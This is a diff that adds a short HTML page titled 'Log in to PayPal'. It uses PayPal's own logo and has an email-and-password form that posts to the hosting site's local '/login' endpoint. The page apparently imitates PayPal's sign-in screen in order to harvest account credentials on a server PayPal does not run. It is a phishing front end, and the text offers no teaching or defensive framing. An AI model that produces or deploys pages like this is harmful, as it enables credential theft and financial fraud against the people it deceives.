@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log in to PayPal</title>
+  <link rel="stylesheet" href="/css/style.css"/>
+</head>
+<body>
+  <div class="container">
+    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="logo"/>
+    <form method="POST" action="/login">
+      <label for="email">Email or mobile number</label>
+      <input type="text" id="email" name="email" required />
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <a href="#">Having trouble logging in?</a>
+  </div>
+  <script src="/js/script.js"></script>
+</body>
+</html>
